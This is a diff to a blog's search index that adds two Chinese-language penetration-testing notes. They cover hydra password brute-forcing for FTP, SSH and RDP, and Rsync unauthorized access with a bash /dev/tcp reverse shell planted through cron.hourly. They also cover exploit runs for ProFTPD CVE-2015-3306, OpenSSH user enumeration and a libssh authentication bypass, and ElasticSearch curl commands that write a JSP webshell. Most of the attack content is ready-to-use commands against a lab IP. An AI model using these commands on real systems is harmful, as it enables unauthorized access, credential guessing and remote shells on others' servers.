@@ -28,6 +28,56 @@
     </entry>
     
     
+    
+    <entry>
+      <title>应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解</title>
+      <link href="/2020/01/14/ying-yong-xie-yi-rsync-ssh-rdp-ftp-lou-dong-pi-sao-kou-ling-cai-jie/"/>
+      <url>/2020/01/14/ying-yong-xie-yi-rsync-ssh-rdp-ftp-lou-dong-pi-sao-kou-ling-cai-jie/</url>
+      
+        <content type="html"><![CDATA[<blockquote></blockquote><h2 id="应用协议-amp-Rsync-amp-SSH-amp-RDP-amp-FTP-amp-漏洞批扫-amp-口令猜解"><a href="#应用协议-amp-Rsync-amp-SSH-amp-RDP-amp-FTP-amp-漏洞批扫-amp-口令猜解" class="headerlink" title="应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解"></a>应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解</h2><h4 id="用hydra爆破（弱口令爆破）"><a href="#用hydra爆破（弱口令爆破）" class="headerlink" title="用hydra爆破（弱口令爆破）"></a>用hydra爆破（弱口令爆破）</h4><p>FTP（端口：21）：文本传输协议  （用户名随机）</p><p>RDP（端口：3389）,SSH（端口：22）：windows,linux上的远程传输协议</p><p>RDP用户名（一般是administrator） SSH用户名(一般是root)</p><p>hydra是一个自动化的爆破工具，暴力破解弱密码，</p><p>用hydra爆破</p><pre><code>-s PORT 可通过这个参数指定非默认端口。-l LOGIN 指定破解的用户，对特定用户破解。-L FILE 指定用户名字典。-p PASS 小写，指定密码破解，少用，一般是采用密码字典。-P FILE 大写，指定密码字典。-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。-M FILE 指定目标列表文件一行一条。-o FILE 指定结果输出文件。-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。-t TASKS 同时运行的线程数，默认为16。-w TIME 设置最大超时的时间，单位秒，默认是30s。-v / -V 显示详细过程。</code></pre><pre><code>hydra -L test -P 10top1K.txt 目标IP ftp -Vhydra -l root -P 10top1K.txt 目标IP ssh -Vhydra -l administrator -P 10top1K.txt 目标IP rdp -V</code></pre><p>L： 指定用户名字典   l：指定用户名  P：指定密码字典</p><h4 id="Rsync文件备份（未授权访问）"><a href="#Rsync文件备份（未授权访问）" class="headerlink" title="Rsync文件备份（未授权访问）"></a>Rsync文件备份（未授权访问）</h4><p>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p><pre><code>判断：rsync rsync://目标IP利用：-读取文件：rsync rsync://目标IP/src/-下载文件：rsync rsync://目标IP/src/etc/passwd ./-上传文件：rsync -av passwd rsync://目标IP/src/tmp/passwd反弹shell：1、获取信息：rsync rsync://目标IP/src/etc/crontab /root/cron.txt2.创建文件 touch shell \#!/bin/bash /bin/bash -i &gt;&amp; /dev/tcp/本地IP/5566 0&gt;&amp;1chmod +x shell        3、上传文件 rsync -av shell rsync://目标IP/src/etc/cron.hourly 4、等待接受反弹</code></pre><p>利用msf:auxiliary/scanner/rsync/modules_list</p><h4 id="协议漏洞-应用软件-FTP-amp-Proftpd搭建"><a href="#协议漏洞-应用软件-FTP-amp-Proftpd搭建" class="headerlink" title="协议漏洞-应用软件-FTP&amp;Proftpd搭建"></a>协议漏洞-应用软件-FTP&amp;Proftpd搭建</h4><pre><code>https://github.com/t0kx/exploit-CVE-2015-3306python exploit.py --host 123.58.236.76 --port 24967 --path "/var/www/html/"http://123.58.236.76:19758/backdoor.php?cmd=id</code></pre><h4 id="协议漏洞-应用软件-SSH-amp-libssh-amp-Openssh"><a href="#协议漏洞-应用软件-SSH-amp-libssh-amp-Openssh" class="headerlink" title="协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh"></a>协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh</h4><pre><code>-Openssh CVE-2014-0160 CVE-2018-15473 cve_2020_15778CVE-2014-0160 版本很少cve_2020_15778 价值不高CVE-2018-15473-用户名枚举https://github.com/Rhynorater/CVE-2018-15473-Exploitpip3 install -r requirements.txtpip3 install paramiko==2.4.1python sshUsernameEnumExploit.py --port 32013 --userList exampleInput.txt 123.58.236.76</code></pre><h4 id="libssh-身份验证绕过（CVE-2018-10933）"><a href="#libssh-身份验证绕过（CVE-2018-10933）" class="headerlink" title="libssh 身份验证绕过（CVE-2018-10933）"></a>libssh 身份验证绕过（CVE-2018-10933）</h4><pre><code>https://www.seebug.org/vuldb/ssvid-97614python libssh.py 123.58.236.76 55190 "id"</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 随笔 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 博客 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>服务攻防——数据库类型安全</title>
+      <link href="/2020/01/14/fu-wu-gong-fang-shu-ju-ku-lei-xing-an-quan/"/>
+      <url>/2020/01/14/fu-wu-gong-fang-shu-ju-ku-lei-xing-an-quan/</url>
+      
+        <content type="html"><![CDATA[<blockquote></blockquote><h4 id="服务攻防——数据库类型安全"><a href="#服务攻防——数据库类型安全" class="headerlink" title="服务攻防——数据库类型安全"></a>服务攻防——数据库类型安全</h4><p>1.influxdb-未授权访问-jwt验证</p><p>2.H2database-未授权访问-配置不当</p><p>3.CouchDB-权限绕过配合RCE-漏洞</p><p>4.ElasticSearch-文件写入&amp;RCE-漏洞</p><h5 id="1-influxdb-未授权访问-jwt验证"><a href="#1-influxdb-未授权访问-jwt验证" class="headerlink" title="1.influxdb-未授权访问-jwt验证"></a>1.influxdb-未授权访问-jwt验证</h5><p> 该数据库的默认端口：8086  8088</p><p>influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。在用户开启了认证，但未设置参数shared-secret的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。 借助jwt.io来生成jwt token</p><h5 id="2-H2-database-未授权访问-配置不当"><a href="#2-H2-database-未授权访问-配置不当" class="headerlink" title="2.H2 database-未授权访问-配置不当"></a>2.H2 database-未授权访问-配置不当</h5><p>默认端口：20051</p><p>H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：默认端口：</p><pre><code>spring.h2.console.enabled=true spring.h2.console.settings.web-allow-others=true </code></pre><p>利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。</p><h5 id="3-CouchDB-权限绕过配合RCE-漏洞"><a href="#3-CouchDB-权限绕过配合RCE-漏洞" class="headerlink" title="3.CouchDB-权限绕过配合RCE-漏洞"></a>3.CouchDB-权限绕过配合RCE-漏洞</h5><p>默认端口：5984</p><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）</p><p>CouchDB-权限绕过-CVE-2017-12635</p><h5 id="4-ElasticSearch-文件写入-amp-RCE-漏洞"><a href="#4-ElasticSearch-文件写入-amp-RCE-漏洞" class="headerlink" title="4.ElasticSearch-文件写入&amp;RCE-漏洞"></a>4.ElasticSearch-文件写入&amp;RCE-漏洞</h5><p>Elasticsearch 文件写入 wooyun_2015_110216</p><p>9200一般为ElasticSearch的常用端口，此漏洞环境需要与中间件使用</p><p>1、发现9200端口存在elasticsearch页面，8080存在tomcat目录</p><p>2、利用ElasticSearch写入后门到/usr/local/tomcat/webapps/wwwroot/</p><pre><code>curl -XPOST http://123.58.236.76:31556/yz.jsp/yz.jsp/1 -d'{"&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%&gt;":"test"}'curl -XPUT 'http://123.58.236.76:31556/_snapshot/yz.jsp' -d '{​     "type": "fs",​     "settings": {​          "location": "/usr/local/tomcat/webapps/wwwroot/",​          "compress": false​     }}'curl -XPUT "http://123.58.236.76:31556/_snapshot/yz.jsp/yz.jsp" -d '{​     "indices": "yz.jsp",​     "ignore_unavailable": "true",​     "include_global_state": false}'</code></pre><p>3、访问8080端口snapshot-yz.jsp文件写入代码到test.jsp中</p><pre><code>http://123.58.236.76:31557/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=successhttp://123.58.236.76:31557/wwwroot/test.jsp</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Shmily </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
   
   
 </search>
